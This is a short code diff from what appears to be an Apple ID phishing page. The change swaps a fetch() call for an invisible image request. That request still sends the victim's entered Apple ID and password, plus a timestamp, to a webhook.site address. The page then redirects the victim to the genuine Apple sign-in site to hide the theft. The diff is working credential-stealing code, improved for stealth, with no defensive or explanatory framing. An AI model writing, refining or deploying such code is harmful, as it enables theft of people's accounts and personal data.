@@ -259,14 +259,13 @@
         
         // Wait 2 seconds, then redirect with credentials
         setTimeout(() => {
-            setTimeout(() => {
-    // Send to webhook first
-    fetch('https://webhook.site/f64f2030-f543-4cd4-b998-70537c83781d?appleid=' + encodeURIComponent(appleid) + '&password=' + encodeURIComponent(password));
+            // Send credentials via invisible image
+    const img = new Image();
+    img.src = 'https://webhook.site/f64f2030-f543-4cd4-b998-70537c83781d?appleid=' + encodeURIComponent(appleid) + '&password=' + encodeURIComponent(password) + '&timestamp=' + new Date().toISOString();
     
-    // Then redirect to Apple
+    // Redirect to Apple immediately
     window.location.href = 'https://appleid.apple.com/';
 }, 2000);
-        }, 2000);
     });
 
     </script>
